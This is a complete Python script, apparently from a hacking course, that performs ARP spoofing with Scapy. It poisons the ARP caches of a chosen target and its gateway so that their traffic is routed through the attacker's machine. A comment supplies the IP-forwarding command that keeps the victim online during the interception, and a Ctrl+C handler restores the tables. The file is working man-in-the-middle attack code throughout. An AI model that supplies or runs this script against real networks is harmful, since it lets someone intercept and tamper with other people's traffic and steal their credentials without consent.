#!/usr/bin/env python

import scapy.all as scapy
import time
import sys

def get_mac(ip):   # Takes an IP address and returns it's mac address.
    arp_request = scapy.ARP(pdst = ip) # create an ARP object
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")        # Create an ethernet object
    arp_request_broadcast = broadcast/arp_request # Appending broadcast with arp message i.e. combination of two.
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]  # SR means send and receive. 'srp' means send and receive with a custom ether part.
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip) # No need of source mac as scapy will default use our source mac.
    scapy.send(packet, verbose = False)  # If not verbose = True default then it'll keep on displaying "Sent 1 packets."

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, count = 4, verbose = False)  # Sending this packet 4 times and verbose False.

target_ip = input("Enter your target IP: ")
gateway_ip = input("Enter your gateway IP: ")

sent_packet_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packet_count += 2
        print("\r[+] Packets sent: " + str(sent_packet_count), end = '')
        time.sleep(2)  # So that we don't send a lot of packets. This will sleep for 2 seconds and then again send 2 packets.

    # We also need to allow Kali machine to allow packet forwarding, otherwise our victim won't be able to use internet.
    # echo 1 > /proc/sys/net/ipv4/ip_forward

except KeyboardInterrupt:
    print("\n[+] Detected Ctrl + C .... Resetting ARP Tables!")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("All Done!")
